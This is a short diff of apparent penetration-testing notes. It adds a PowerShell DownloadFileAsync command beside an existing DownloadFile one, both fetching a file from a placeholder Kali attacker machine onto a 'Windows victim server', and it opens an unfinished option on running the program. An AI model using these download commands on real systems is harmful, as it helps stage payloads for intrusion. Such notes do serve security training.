@@ -10,3 +10,6 @@ Option 2) Powershell
 
 This is the example to download the file in to the Windows victim server 
         (New-Object Net.WebClient).DownloadFile('http://<kali machine:port>/<Target File URL>','<Output File Name>')
+        (New-Object Net.WebClient).DownloadFileAsync('http://<kali machine:port>/<Target File URL','<Output File Name>')
+
+Option 3) If we want to run the program 
